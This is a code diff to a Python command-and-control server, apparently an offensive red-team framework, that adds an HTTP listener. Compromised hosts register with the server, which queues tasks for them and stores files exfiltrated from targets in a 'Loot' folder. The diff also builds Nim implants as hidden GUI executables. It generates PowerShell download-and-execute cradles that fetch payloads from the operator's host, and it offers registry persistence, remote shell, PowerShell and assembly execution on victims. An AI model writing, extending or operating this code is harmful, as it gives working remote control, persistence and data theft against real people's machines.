@@ -16,14 +16,32 @@ import randomname
 from Cryptodome.PublicKey import RSA
 import re
 import atexit
-#from rich import print
 from rich.progress import track
 import secrets
 import colorama
 from colorama import Fore, Back, Style
 import readline
+from flask import Flask
+from flask import request
+from flask import jsonify
+import logging
+from flask import cli
+from queue import Queue
+from flask import abort
+from flask import render_template
+import psutil
+import sys
 
 
+project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
+sys.path.append(project_root)
+
+from utils import RC4Util
+
+cwd = os.getcwd()
+rc4 = RC4Util.RC4()
+template_folder = os.path.expanduser(f'{cwd[:-3]}/Templates/')
+app = Flask(__name__, template_folder=template_folder) 
 
 def banner():
     print('╔═╗┬─┐┬┌┬┐┬ ┬┌─┐  ╔═╗2')
@@ -36,20 +54,18 @@ def help():
     ------------------------------------------------------------------------------------------------------
     Menu Commands
     ------------------------------------------------------------------------------------------------------
-    listeners -g                --> Generate a new listener on desired interface
-    nimplant                    --> Generate a compiled exe payload written in nim with advanced capabilities for windows
-    sessions -l                 --> List callbacks
-    sessions -i <sessions_val>  --> Enter a callback session
-    use <sessions_val>          --> Enter a callback session
+    listener -g <TYPE>          --> Generate a HTTP or TCP listener
+    nimplant -g <TYPE>          --> Generate a compiled exe payload written in nim with advanced capabilities for windows for either TCP or HTTP
+    callbacks                   --> List callbacks
+    use <callback ID> [use 0]   --> Enter a callback session
     pwsh_cradle                 --> Generate a pwsh cradle for a payload on the payloads server
     kill <sessions_val>         --> Terminate active callback
+    payloads                    --> List payloads available on for either transfer or execution
     exit                        --> exit from the server
 
     Implant Commands
     ------------------------------------------------------------------------------------------------------
     background                  --> Backgrounds current sessions
-    persist                     --> Establish persistance trough registry keys(needs to be in the same
-                                    dir as the implant on target disk)
     exit                        --> Terminate current session
     GetAV                       --> Get the current AV running
     pwsh <COMMAND>              --> Load CLR and run powershell in unmanged runspace 
@@ -57,7 +73,11 @@ def help():
     ls                          --> List files in current directory
     cd <dir>                    --> Change current working directory
     pwd                         --> Print current working directory
-    shell                       --> Run Windows CMD commands on target
+    payloads                    --> List payloads available on for either transfer or execution
+    shell <COMMAND>             --> Run Windows CMD commands on target
+    sleep <milseconds>          --> Adjust callback time [Default 5000] - HTTP only
+    persist <k_name> <payload>  --> Deploy regsitry persistance to run a payload on startup(OPSEC: RISKY) - HTTP only
+    download <file>             --> Download file from target(dont use "" around file name or path) - HTTP only
     ''')
 
 def help_implant():
@@ -66,8 +86,6 @@ def help_implant():
     Implant Commands
     ------------------------------------------------------------------------------------------------------
     background                  --> Backgrounds current sessions
-    persist                     --> Establish persistance trough registry keys(needs to be in the same
-                                    dir as the implant on target disk)
     exit                        --> Terminate current session
     GetAV                       --> Get the current AV running
     pwsh <COMMAND>              --> Load CLR and run powershell in unmanged runspace 
@@ -75,7 +93,11 @@ def help_implant():
     ls                          --> List files in current directory
     cd <dir>                    --> Change current working directory
     pwd                         --> Print current working directory
-    shell                       --> Run Windows CMD commands on target
+    payloads                    --> List payloads available on for either transfer or execution
+    shell <COMMAND>             --> Run Windows CMD commands on target
+    sleep <milseconds>          --> Adjust callback time [Default 5000] - HTTP only
+    persist <k_name> <payload>  --> Deploy regsitry persistance to run a payload on startup(OPSEC: RISKY) - HTTP only
+    download <file>             --> Download file from impant(dont use "" around file name or path) - HTTP only
     ''')
 
 
@@ -93,7 +115,223 @@ def listener_handler(): # Function to handle incoming connections and send bytes
     t1 = threading.Thread(target=comm_handler)
     t1.daemon = True
     t1.start()
+
+
     
+def httpListenerHandler():
+    global host_ip
+    cli.show_server_banner = lambda *_: None
+    flask_t = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(host_port), debug=False, use_reloader=False))
+    flask_t.daemon = True
+    flask_t.start()
+
+    addrs = psutil.net_if_addrs()
+    print(f'{Fore.CYAN}Interfaces on system:' + Fore.RESET)
+    for interface in addrs.keys():
+        print(f'>> {Fore.CYAN}{interface}' + Fore.RESET)
+        completer.add_keyword(interface)
+
+    host_ip = resolve_ip(input(Fore.CYAN + '[#] Enter the interface to listen on: '+ Fore.RESET))
+    print(f'{Fore.LIGHTYELLOW_EX}[*] HTTP listener started - Awaiting HTTP callbacks from implants on {host_ip}:{host_port}')
+
+
+
+#############################################Flask Stuff#############################################
+logging.getLogger('werkzeug').disabled = True
+
+
+task_queue = {}
+
+
+@app.route('/')
+def hello():
+    return render_template('index.html')
+
+@app.route('/reg', methods=['POST'])
+def register():
+    
+    # Access the data sent in the request
+    data = request.get_json()
+
+    # Extract the necessary information from the data
+    
+    key_validation = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'authKey')))
+    if key_validation != auth_key:
+        print(f'{Fore.RED}[-] An error occurred while registering the implant, likely due to incorrect key\n'+Fore.LIGHTYELLOW_EX +'Enter command#>', end="")
+        return abort(403)
+    id = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'id')))
+    username = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'username')))
+    os = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'os')))
+    isadmin = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'isAdmin')))
+    hostname = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'hostname')))
+    publicIP = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'publicIP')))
+    amsi = rc4.deobf(RCKey,data.get(rc4.obf(RCKey,'amsi')))
+    if isadmin == "1":
+        admin_value = 'Yes'
+    else:
+        admin_value = 'No'
+    if 'windows' in os:
+        pay_val = 1
+    else:
+        pay_val = 2
+    
+    if amsi == "0":
+        amsi = 'Disabled'
+    else:
+        amsi = 'Running'
+    
+    task_queue[id] = []
+    cur_time = time.strftime("%H:%M:%S",time.localtime())
+    date = datetime.now()
+    time_record = (f'{date.day}/{date.month}/{date.year} {cur_time}')
+    
+    if hostname is not None:
+        targets.append([id, f"{hostname}@{publicIP}", time_record, username, admin_value, os, pay_val,'Active',amsi]) #Appending info to targets list
+        print(f'{Fore.GREEN}[+] Callback recieved from {hostname}@{publicIP}\n' +Fore.LIGHTYELLOW_EX +'Enter command#> ', end="")
+        
+    else: 
+        targets.append([id, publicIP, time_record, username, admin_value, os, 'Active'])
+        print(f'{Fore.LIGHTYELLOW_EX}[+] Callback recieved from {publicIP}\n' + Fore.LIGHTYELLOW_EX+'Enter command#> ', end="")
+        # Return a response
+        
+    return '200'
+
+@app.route('/tasks/<agent_id>', methods=['GET'])
+async def serve_tasks(agent_id):
+    # Check if the agent exists in the task queues
+    if agent_id in task_queue:
+        # Retrieve the tasks for the agent
+        tasks = []
+        while len(task_queue[agent_id]) > 0:
+            tasks.append(task_queue[agent_id].pop(0))
+        # Return the tasks as a JSON response
+        return jsonify(tasks)
+    else:
+        return '404'
+
+@app.route('/result', methods=['POST'])
+async def send_results():
+    
+    if request.headers.get('X-Upload') == 'true':
+        try:
+            data = request.get_json()
+            agent_id = data[rc4.obf(RCKey,'id')]
+            agent_id = rc4.deobf(RCKey,agent_id)
+            print(f'Result from implant ID: {agent_id}')
+            result = data[rc4.obf(RCKey,'data')]
+            result = rc4.deobf(RCKey, result)
+            filename = data[rc4.obf(RCKey,'filename')]
+            filename = rc4.deobf(RCKey, filename)
+
+            cwd_payload = os.getcwd()
+            loot_loc = os.path.expanduser(f'{cwd_payload}/Loot')
+
+            with open(f"{loot_loc}/{filename}", "w") as f:
+                f.write(result)
+            print(f'{Fore.GREEN}[+] File saved to loot directory at: {loot_loc}/{filename}')
+            print(f'{Fore.LIGHTYELLOW_EX}{targets[num][3]}/{targets[num][1]}#>', end="")
+        except:
+            print(f'{Fore.RED}[-] An error occurred while receiving the file from the implant(likely due to encoding issues)')
+            pass
+    else:
+    # Access the data sent in the request
+        try:
+            data = request.get_json()
+            # Extract the necessary information from the data
+            agent_id = data[rc4.obf(RCKey,'id')]
+            agent_id = rc4.deobf(RCKey,agent_id)
+            print(f'Result from implant ID: {agent_id}')
+            result = data[rc4.obf(RCKey,'data')]
+            result = rc4.deobf(RCKey, result)
+
+
+            # Update the task in the task queue
+            if agent_id in task_queue:
+                if len(task_queue[agent_id]) > 0:
+                    task_queue[agent_id].pop(0)  # Remove the completed task from the queue
+
+            # Perform the logic to process the results received from the implant
+            print(f'\n{Fore.LIGHTYELLOW_EX}Response received from task:{Fore.RESET}\n{result}\n{Fore.LIGHTWHITE_EX}{targets[num][3]}/{targets[num][1]}#>', end="")
+
+            directory = os.getcwd()
+            cleandir = os.listdir( directory )
+            for item in cleandir:
+                if item.endswith("NimByteArray.txt"):
+                    os.remove( os.path.join( directory, item ) )
+        except:
+            print(f'{Fore.RED}[-] An error occurred while receiving the data from the implant(likely due to encoding issues)')
+            pass
+
+
+    return '200'
+
+def add_task(command):
+    if target_id not in task_queue:
+        task_queue[target_id] = []
+    task_queue[target_id].append(rc4.obf(RCKey,command))
+
+def kill_http(target_id, command):
+    add_task(command)
+    targets[num][7] = Fore.RED + 'Dead' + Fore.RESET
+    
+
+def http_target_comm(target_id, targets, num, task_queue):
+    while True:
+        command = input(f'{Fore.LIGHTWHITE_EX}{targets[num][3]}/{targets[num][1]}#> ') 
+        if len(command) == 0:
+            continue
+        elif command == 'help':
+            help_implant()
+        
+        elif command == 'exit':
+            add_task(command)
+            targets[num][7] = Fore.RED + 'Dead' + Fore.RESET
+            break
+
+        elif command == 'background':
+            break
+
+        elif command.split(" ")[0] == 'execute-ASM':
+            global outfile
+            args = list(command.split(" "))
+            if len(args) > 0:
+                CSharpToNimByteArray(args[1])
+            else:
+                print(Fore.LIGHTYELLOW_EX + "Please provide a file name as an argument.")
+                return                
+            try:
+                with open(outfile, "r") as f:
+                    rub = f.read()
+                size = os.stat(outfile).st_size
+                print(f'{Fore.LIGHTYELLOW_EX}[*] Size of asm is: {size}')
+                if target_id not in task_queue:
+                    task_queue[target_id] = []
+                command = rc4.obf(RCKey,command)
+                rub = rc4.obf(RCKey,rub)
+                task_queue[target_id].extend((command, rub))
+            except:
+                pass
+        elif command == 'GetAV':
+            add_task(command)
+        elif command.split(" ")[0] == 'cd':
+            add_task(command)
+        elif command == 'pwd':
+            add_task(command)
+        elif command.split(" ")[0] == 'ls':
+            add_task(command)
+        elif command.split(" ")[0] == 'shell':
+            add_task(command)
+        elif command.split(" ")[0] == 'pwsh':
+            add_task(command)
+        elif command == 'payloads':
+            payload_list()
+        elif command.split(" ")[0] == 'persist':
+            add_task(command)
+        elif command.split(" ")[0] == 'download':
+            add_task(command)
+            
+        else:
+            print(f'{Fore.LIGHTYELLOW_EX}[*] Command not recognized')
 
     
 def fix_base64_padding(base64_string):
@@ -159,6 +397,9 @@ def target_comm(target_id, targets, num):
 
             if message == 'help\n':
                 help_implant()
+            
+            if message == 'payloads':
+                payload_list()
            
              
             if message == 'GetAV':
@@ -227,12 +468,13 @@ def comm_handler():
                     pay_val = 1
                 else:
                     pay_val = 2
+                amsi_tcp = "N/A"
                 cur_time = time.strftime("%H:%M:%S",time.localtime())
                 date = datetime.now()
                 time_record = (f'{date.day}/{date.month}/{date.year} {cur_time}')
-                
+
                 if host_name is not None:
-                    targets.append([remote_target, f"{host_name}@{public_ip}", time_record, username, admin_value, operating_system, pay_val,'Active']) #Appending info to targets list
+                    targets.append([remote_target, f"{host_name}@{public_ip}", time_record, username, admin_value, operating_system, pay_val,'Active', amsi_tcp]) #Appending info to targets list
                     print(f'{Fore.GREEN}[+] Callback recieved from {host_name}@{public_ip}\n' +Fore.LIGHTYELLOW_EX +'Enter command#> ', end="")
                 else: 
                     targets.append([remote_target, remote_ip[0], time_record, username, admin_value, operating_system, 'Active'])
@@ -241,6 +483,7 @@ def comm_handler():
                 remote_target.close()
         except:
             pass
+
 
 
 
@@ -294,6 +537,65 @@ def nimplant():
     implant_loc = os.path.expanduser(f'{cwd_nim}/Generated_Implants')
     os.remove(f'{implant_loc}/{f_name}')
 
+def nimplant_HTTP():
+    global host_ip
+    global host_port
+    random_name = randomname.get_name()
+    compile_name = (''.join(random.choices(string.ascii_lowercase, k=7)))
+    cwd_nim = os.getcwd()
+    f_name= f'{compile_name}.nim'
+    exe_file = f'{random_name}.exe'
+    
+    URL = f'{host_ip}:{host_port}'
+    id = (''.join(random.choices(string.ascii_lowercase, k=4)))
+    
+    file_loc = os.path.expanduser(f'{cwd_nim[:-3]}/implant/implant_HTTP.nim')
+    implant_loc = os.path.expanduser(f'{cwd_nim}/Generated_Implants')
+    if os.path.exists(file_loc):
+        shutil.copy(file_loc, f_name)
+        shutil.move(f_name, implant_loc)
+    else:
+        print(f'{Fore.RED}[-] implant_HTTP.nim not found in {file_loc}')
+    print(Fore.CYAN + '[*] Use listener address or specify other IP for implant to connect to: ')
+    print(Fore.CYAN + '[*] 1. Listener adress')
+    print(Fore.CYAN + '[*] 2. Other IP')
+    imp_choice = input(Fore.LIGHTYELLOW_EX + '[#] Enter 1 or 2: ' + Fore.RESET)
+    if imp_choice == "1":
+        pass
+    else:
+        host_ip = input('[*] Specify IP: ')
+    with open(f'{implant_loc}/{f_name}') as f:
+        patch_host = f.read().replace('URL', str(URL.strip()))
+    with open(f'{implant_loc}/{f_name}', 'w') as f:
+        f.write(patch_host)
+        f.close()
+    with open(f'{implant_loc}/{f_name}') as f:
+        patch_port = f.read().replace('ID', str(id))
+    with open(f'{implant_loc}/{f_name}', 'w') as f:
+        f.write(patch_port)
+        f.close()
+    with open(f'{implant_loc}/{f_name}') as f:
+        new_key = f.read().replace('AUTH_KEY', auth_key)
+    with open(f'{implant_loc}/{f_name}', 'w') as f:
+        f.write(new_key)
+        f.close()
+    with open(f'{implant_loc}/{f_name}') as f:
+        RC_patch = f.read().replace('RCKEY', RCKey)
+    with open(f'{implant_loc}/{f_name}', 'w') as f:
+        f.write(RC_patch)
+        f.close()
+    compile_cmd = [f"nim", "c", "-d:mingw", "-d:release","--app:gui" ,"-d:strip","--cpu:amd64",f"-o:{implant_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
+    for _ in track(range(4), description=f'[green][*] Compiling executeable {exe_file}...'):
+        process = subprocess.Popen(compile_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        process.wait()
+    implant_loc = os.path.join(implant_loc, exe_file)
+    if os.path.exists(implant_loc):
+        print(f'{Fore.GREEN}[+] {exe_file} saved to {implant_loc}')   
+    else:
+        print(Fore.RED + '[-] An error occurred while compiling the implant')
+    implant_loc = os.path.expanduser(f'{cwd_nim}/Generated_Implants')
+    os.remove(f'{implant_loc}/{f_name}')
+
 def resolve_ip(interface):
     
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -305,11 +607,17 @@ def resolve_ip(interface):
         
 
 def pwsh_cradle():
-    try:
-        payload_name = input(Fore.LIGHTYELLOW_EX + '[*] Input payload name for transfer: ')
-        cwd_payload = os.getcwd()
-        check_file_loc = os.path.expanduser(f'{cwd_payload}/Payloads/{payload_name}')
-        
+   
+    cwd_payload = os.getcwd()
+    payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')
+    payload_name = []
+    global check_file_loc 
+    for file in os.listdir(payload_loc):
+        payload_name.append(file)
+        check_file_loc = os.path.expanduser(f'{cwd_payload}/Payloads/{file}')
+
+
+    for i in payload_name:
         if os.path.exists(check_file_loc):
             runner_file = (''.join(random.choices(string.ascii_lowercase, k=8)))
             runner_file = f'{runner_file}.exe'
@@ -317,9 +625,9 @@ def pwsh_cradle():
             random_exe = f'{random_exe}.exe'
             payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')
             print(f'{Fore.LIGHTGREEN_EX}[*] Payload server available at {host_ip}:8999')
-            runner_cal_unencoded = f"iex (new-object net.webclient).downloadstring('http://{host_ip}:8999/Payloads/{runner_file}')".encode('utf-16le')
+            runner_cal_unencoded = f"iex (new-object net.webclient).downloadstring('http://{host_ip}:8999/{runner_file}')".encode('utf-16le')
             with open(runner_file, 'w') as f:
-                f.write(f'powershell -c wget http://{host_ip}:8999/Payloads/{payload_name} -outfile {random_exe};Start-Process -FilePath {random_exe} ')
+                f.write(f'powershell -c wget http://{host_ip}:8999/{i} -outfile {random_exe};Start-Process -FilePath {random_exe} ')
                 f.close()
                 shutil.move(runner_file, payload_loc)
             b64_runner = base64.b64encode(runner_cal_unencoded)
@@ -329,12 +637,19 @@ def pwsh_cradle():
             print(f'{Fore.CYAN}\n[+] Unencoded payload\n\n{b64_runner_decoded}')
         else:
             print(f'{Fore.RED}[-] {check_file_loc} does not exist in payloads folder... Try another payload ')
-    except(NameError):
-        print(f'{Fore.RED}[*] Payload server not running yet.. start listener: <listener -g>')
+
+        
 
 def web_payload_server():
     
-    http_handler = SimpleHTTPRequestHandler
+    cwd_payload = os.getcwd()
+    payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')
+
+    class Handler(http.server.SimpleHTTPRequestHandler):
+        def __init__(self, *args, **kwargs):
+            super().__init__(*args, directory=payload_loc, **kwargs)
+
+    http_handler = Handler
     http_handler.log_message = lambda *args, **kwargs: None
     server = http.server.ThreadingHTTPServer((host_ip, 8999), http_handler)
     
@@ -417,22 +732,23 @@ def redirector(LPORT):
 
 def CSharpToNimByteArray(inputfile, folder=False):
     global outfile
-    if folder:
-        files = os.listdir(inputfile)
-        for file in files:
-            print(f"{Fore.LIGHTYELLOW_EX}[*] Converting {file}")
-            outfile = file + "NimByteArray.txt"
-    
-            with open(file, "rb") as f:
-                hex_data = f.read().hex()
-                hex_string = ",0x".join(hex_data[i:i+2] for i in range(0, len(hex_data), 2))
-                hex_string = "0x" + hex_string
-                with open(outfile, "w", encoding="utf-8") as out:
-                    out.write(hex_string)
-    
-        print(Fore.GREEN + "[*] Results Written to the same folder")
-    else:
-        try:
+    try:
+        if folder:
+            files = os.listdir(inputfile)
+            for file in files:
+                print(f"{Fore.LIGHTYELLOW_EX}[*] Converting {file}")
+                outfile = file + "NimByteArray.txt"
+        
+                with open(file, "rb") as f:
+                    hex_data = f.read().hex()
+                    hex_string = ",0x".join(hex_data[i:i+2] for i in range(0, len(hex_data), 2))
+                    hex_string = "0x" + hex_string
+                    with open(outfile, "w", encoding="utf-8") as out:
+                        out.write(hex_string)
+        
+            print(Fore.GREEN + "[*] Results Written to the same folder")
+        else:
+            
             cwd_payload = os.getcwd()
             inputfile_path = os.path.expanduser(f'{cwd_payload}/Payloads')
             print(f"Converting {inputfile}")
@@ -446,34 +762,56 @@ def CSharpToNimByteArray(inputfile, folder=False):
                     out.write(hex_string)
             
             print(f"{Fore.GREEN}[*] Result Written to {outfile}")
-        except:
-            print(f"{Fore.RED}[-] File not found")
 
-    # dos2unix conversion
-    with open(outfile, "r") as f:
-        content = f.read()
-        with open(outfile, "w") as out:
-            out.write(content.replace("\r\n", "\n"))
 
-class MyCompleter(object):  # Custom completer
+        # dos2unix conversion
+        with open(outfile, "r") as f:
+            content = f.read()
+            with open(outfile, "w") as out:
+                out.write(content.replace("\r\n", "\n"))
+    except:
+        print(f"{Fore.RED}[-] File not found")
+        pass
+
+class MyCompleter(object):  
 
     def __init__(self, options):
         self.options = sorted(options)
 
     def complete(self, text, state):
-        if state == 0:  # on first trigger, build possible matches
-            if text:  # cache matches (entries that start with entered text)
+        if state == 0:  
+            if text: 
                 self.matches = [s for s in self.options 
                                     if s and s.startswith(text)]
-            else:  # no text entered, all matches possible
+            else: 
                 self.matches = self.options[:]
 
-        # return match indexed by state
+       
         try: 
             return self.matches[state]
         except IndexError:
             return None
-   
+    
+    def add_keyword(self, keyword):
+        self.options.append(keyword)
+        self.options = sorted(self.options)
+
+def payload_list():
+    cwd_payload = os.getcwd()
+    payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')
+    print(f'{Fore.LIGHTYELLOW_EX}[*] Available payloads: ')
+    for file in os.listdir(payload_loc):
+        print(f'{Fore.CYAN}>> {file}')
+        if file not in keywords:
+            completer.add_keyword(file)
+
+def payload_keyword_add():
+    cwd_payload = os.getcwd()
+    payload_loc = os.path.expanduser(f'{cwd_payload}/Payloads')
+    for file in os.listdir(payload_loc):
+        if file not in keywords:
+            completer.add_keyword(file)
+
 def exit_handler():
     cwd = os.getcwd()
     print(Fore.LIGHTYELLOW_EX + '[*] Destroying redirector infrastructure...')
@@ -491,7 +829,8 @@ def exit_handler():
         print(Fore.RED+'[-] File not found.')
 
 if __name__ == '__main__':
-    keywords = ["listeners -g", "nimplant", "sessions -l", "use ", "pwsh_cradle", "kill ", "sessions -i", "exit", "help", "background", "persist", "GetAV", "pwsh", "execute-ASM", "ls", "cd", "pwd", "eth0", "lo", "wlan0", "eth1"]
+    global keywords
+    keywords = ["listener -g","HTTP", "TCP" ,"nimplant -g", "callbacks","download","use ", "pwsh_cradle", "kill ", "exit", "help","payloads", "background", "persist", "GetAV", "pwsh", "execute-ASM", "ls", "cd", "pwd", "shell"]
     completer = MyCompleter(keywords)
     readline.set_completer(completer.complete)
     readline.parse_and_bind('tab: complete')
@@ -501,22 +840,31 @@ if __name__ == '__main__':
     targets = [] #store each socket connection
     listener_count = 0
     banner()
+    
     kill_flag = 0
     global host_ip
     global host_port
+    global listen_type
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     if not os.path.exists('Generated_Implants'):
-            print(Fore.LIGHTYELLOW_EX + "[+] Creating Generated Implants Directory...")
-            os.mkdir('Generated_Implants')
+        print(Fore.LIGHTYELLOW_EX + "[+] Creating Generated Implants Directory...")
+        os.mkdir('Generated_Implants')
     if not os.path.exists('Payloads'):
-            print(Fore.LIGHTYELLOW_EX + "[+] Creating Payloads Directory...")
-            os.mkdir('Payloads')
+        print(Fore.LIGHTYELLOW_EX + "[+] Creating Payloads Directory...")
+        os.mkdir('Payloads')
+    if not os.path.exists('Loot'):
+        print(Fore.LIGHTYELLOW_EX + "[+] Creating Loot Directory...")
+        os.mkdir('Loot')
     
+    payload_keyword_add()
     length_gen = secrets.SystemRandom()
     key_length = length_gen.randint(12,33)
     auth_key = (''.join(secrets.token_urlsafe(key_length)))
-    print(f'{Fore.CYAN}[+] Key for this session is {auth_key}')
+    
+    RCkey_length = length_gen.randint(12,18)
+    RCKey = (''.join(secrets.token_urlsafe(key_length)))
+    print(f'{Fore.CYAN}[+] AuthKey for this session is {auth_key}')
 
 
     while True:
@@ -524,7 +872,10 @@ if __name__ == '__main__':
             command = input(Fore.LIGHTYELLOW_EX +'Enter command#>' + Fore.RESET)
             if command == 'help':
                 help()
-            if command == 'listeners -g':
+            elif command == 'payloads':
+                payload_list()
+            if command == 'listener -g TCP':
+                listen_type = 'TCP'
                 try:
                     print(Fore.CYAN + '[*] 1. Interface')
                     print(Fore.CYAN + '[*] 2. IP-Address')
@@ -558,64 +909,96 @@ if __name__ == '__main__':
                 listener_handler()
                 listener_count +=1
                 web_payload_server()
-            elif command == 'nimplant':
+            elif command == 'listener -g HTTP':
+                listen_type = 'HTTP'
+                host_port = int(input(Fore.CYAN + '[#] Enter listening port: ' + Fore.RESET))
+                httpListenerHandler()
+                listener_count +=1
+                web_payload_server()
+            elif command == 'nimplant -g TCP':
                 if listener_count > 0:
                     nimplant()
+                else:
+                    print('[-] Cannot compile payload without active listener')
+            elif command == 'nimplant -g HTTP':
+                if listener_count > 0:
+                    nimplant_HTTP()
                 else:
                     print('[-] Cannot compile payload without active listener')
             if command == 'pwsh_cradle':
                 pwsh_cradle()
 
             if command.split(" ")[0] == 'kill':
-                try:
-                    num = int(command.split(" ")[1])
-                    target_id = (targets[num][0])
-                    if targets[num][7] == 'Active':
-                        kill_signal(target_id, 'exit')
-                        targets[num][7] = 'Dead'
-                        print(f'[-] Session {num} terminated')
-                    else:
-                        print('[-] Cannot interact with a dead session')
-                except(IndexError, ValueError, NameError):
+                if listen_type == 'TCP':
                     try:
-                        print(f'Session {num} does not exist')
-                    except NameError:
-                        print('[-] no active sessions to kill')
-            
-            try:
-                if command.split(" ")[0] == 'sessions':
-                    session_counter = 0
-                    if command.split(" ")[1] == '-l':
-                        session_table = PrettyTable()
-                        session_table.field_names = [Fore.CYAN +'Session','Username', 'Admin' ,'Status' ,'Target','Operating System','Check-in Time']
-                        session_table.padding_width = 3
-                        for target in targets:
-                            session_table.add_row([session_counter, target[3],target[4],target[7], target[1], target[5],target[2]])
-                            session_counter += 1
-                        print(session_table)
-                    if command.split(" ")[1] == '-i':
+                        num = int(command.split(" ")[1])
+                        target_id = (targets[num][0])
+                        if targets[num][7] == 'Active':
+                            kill_signal(target_id, 'exit')
+                            targets[num][7] = 'Dead'
+                            print(f'[-] Session {num} terminated')
+                        else:
+                            print('[-] Cannot interact with a dead session')
+                    except(IndexError, ValueError, NameError):
                         try:
-                            num = int(command.split(" ")[2])
-                            target_id = (targets[num])[0]
-                            if (targets[num])[7] == 'Active':
-                                target_comm(target_id, targets, num)
-                            else: 
-                                print(Fore.RED +'[-] Can not interact with Dead implant')
-                        except IndexError:
-                            try:
-                                print(f'{Fore.RED}[-] Session {num} does not exist')
-                            except(NameError):
-                                print(Fore.RED + '[-] Please provide a session to interact with..')
-            except(IndexError):
-                print(Fore.LIGHTYELLOW_EX +'[*] Please providea flag.. eg <-l> or <-i>')
+                            print(f'Session {num} does not exist')
+                        except NameError:
+                            print('[-] no active sessions to kill')
+                else:
+                    try:
+                        num = int(command.split(" ")[1])
+                        target_id = (targets[num][0])
+                        if targets[num][7] == 'Active':
+                            kill_http(target_id, 'exit')
+                            targets[num][7] = 'Dead'
+                            print(f'{Fore.RED} [-] Session {num} terminated {Fore.RESET}')
+                        else:
+                            print('[-] Cannot interact with a dead session')
+                    except(IndexError, ValueError, NameError):
+                        try:
+                            print(f'Session {num} does not exist')
+                        except NameError:
+                            print('[-] no active sessions to kill')
+            
+            if command.split(" ")[0] == 'callbacks':
+                session_counter = 0
+                
+                if listen_type == 'HTTP':
+                    session_table = PrettyTable()
+                    session_table.field_names = [Fore.CYAN +'ID','Username', 'Admin' ,'Status' ,'Target','Operating System','AMSI','Check-in Time']
+                    session_table.padding_width = 3
+                    for target in targets:
+                        session_table.add_row([str(session_counter) + " - " + target[0], target[3],target[4],target[7], target[1], target[5],target[8],target[2]])
+                        session_counter += 1
+                    print(session_table)
+                else:
+                    session_table = PrettyTable()
+                    session_table.field_names = [Fore.CYAN +'ID','Username', 'Admin' ,'Status' ,'Target','Operating System','AMSI','Check-in Time']
+                    session_table.padding_width = 3
+                    for target in targets:
+                        session_table.add_row([session_counter, target[3],target[4],target[7], target[1], target[5],target[8],target[2]])
+                        session_counter += 1
+                    print(session_table)
+
             if command.split(" ")[0] == 'use':
                 try:
-                    num = int(command.split(" ")[1])
-                    target_id = (targets[num])[0]
-                    if (targets[num])[7] == 'Active':
-                        target_comm(target_id, targets, num)
-                    else: 
-                        print(Fore.RED +'[-] Can not interact with Dead implant')
+                    if listen_type == 'TCP':
+                        print("RUNNING TCP interaction mode")
+                        num = int(command.split(" ")[1])
+                        target_id = (targets[num])[0]
+                        if (targets[num])[7] == 'Active':
+                            target_comm(target_id, targets, num)
+                        else: 
+                            print(Fore.RED +'[-] Can not interact with Dead implant')
+                    elif listen_type == 'HTTP':
+                        print(Fore.LIGHTYELLOW_EX + "RUNNING HTTP interaction mode" + Fore.RESET)
+                        print(Fore.LIGHTYELLOW_EX + "Deafult callback interval: 5 seconds" + Fore.RESET)
+                        num = int(command.split(" ")[1])
+                        target_id = (targets[num])[0]
+                        if (targets[num])[7] == 'Active':
+                            http_target_comm(target_id, targets, num, task_queue)
+                        else: 
+                            print(Fore.RED +'[-] Can not interact with Dead implant')
                 except (IndexError, TypeError):
                     print(f'{Fore.RED}[-] Session {num } does not exist' )
                     
@@ -626,7 +1009,12 @@ if __name__ == '__main__':
                         if target[7] == 'Dead':
                             pass
                         else:
-                            comm_out(target[0], 'exit')
+                            if listen_type == 'TCP':
+                                comm_out(target[0], 'exit')
+                            else:
+                                if target_id not in task_queue:
+                                    task_queue[target_id] = []
+                                task_queue[target_id].append(command)
                     kill_flag = 1
                     if listener_count > 0:
                         sock.close()
@@ -640,7 +1028,14 @@ if __name__ == '__main__':
                     if target[7] == 'Dead':
                         pass
                     else:
-                        comm_out(target[0], 'exit')
+                        if listen_type == 'TCP':
+                            comm_out(target[0], 'exit')
+                        else:
+                            if target_id not in task_queue:
+                                task_queue[target_id] = []
+                            task_queue[target_id].append(command)
+                                
+                            
                 kill_flag = 1
                 if listener_count > 0:
                     sock.close()
